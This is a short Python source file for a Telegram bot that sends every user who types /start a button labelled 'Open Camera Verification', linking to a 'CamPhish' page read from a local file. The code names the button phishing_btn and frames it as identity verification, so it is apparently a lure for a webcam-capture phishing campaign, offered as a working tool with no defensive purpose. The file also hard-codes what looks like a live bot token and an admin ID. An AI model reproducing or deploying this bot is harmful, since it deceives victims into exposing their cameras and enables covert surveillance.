import telebot
from telebot import types

BOT_TOKEN = '7248153675:AAGoDZURkSGGfyWNk-RO7SVsgAqUfGwtF_E'
ADMIN_ID = 7967749703
bot = telebot.TeleBot(BOT_TOKEN)

def get_cam_link():
    try:
        with open("camlink.txt", "r") as f:
            return f.read().strip()
    except:
        return None

@bot.message_handler(commands=['start'])
def start(msg):
    cam_link = get_cam_link()
    if not cam_link:
        bot.send_message(msg.chat.id, "🔌 CamPhish link is not active right now. Contact admin.")
        return
    keyboard = types.InlineKeyboardMarkup()
    phishing_btn = types.InlineKeyboardButton(text="📸 Open Camera Verification", url=cam_link)
    keyboard.add(phishing_btn)
    bot.send_message(msg.chat.id, "Please verify your identity below:", reply_markup=keyboard)

@bot.message_handler(commands=['admin'])
def admin(msg):
    if msg.chat.id == ADMIN_ID:
        bot.send_message(msg.chat.id, "✅ You are the admin.")
    else:
        bot.send_message(msg.chat.id, "⛔ Not authorized.")

bot.polling()
